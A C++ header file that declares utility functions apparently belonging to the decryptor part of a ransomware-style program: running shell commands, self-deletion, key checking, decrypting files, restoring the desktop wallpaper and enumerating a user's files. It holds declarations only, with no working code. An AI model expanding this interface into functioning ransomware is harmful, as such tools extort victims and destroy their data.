#pragma once
#include "..\commons\common.h"
#include <fstream>
#include <atlstr.h>
#include <streambuf>

std::string exec(const char* cmd);
bool fileExists(const std::string& name);
std::vector<std::string> split(const std::string& s, char delimiter);
std::vector<std::vector<std::string>> vectorSplitter(std::vector<std::string> baseVector, int parts);
void deleteMe(std::string myPath);
void decryptFiles(std::vector<std::string> files, std::string key);
bool checkKey(std::string key);
void restoreWallpaper();
std::string getUserName();
void getAllFiles(std::string username);
std::vector<std::string> getFiles(std::string mainDir);
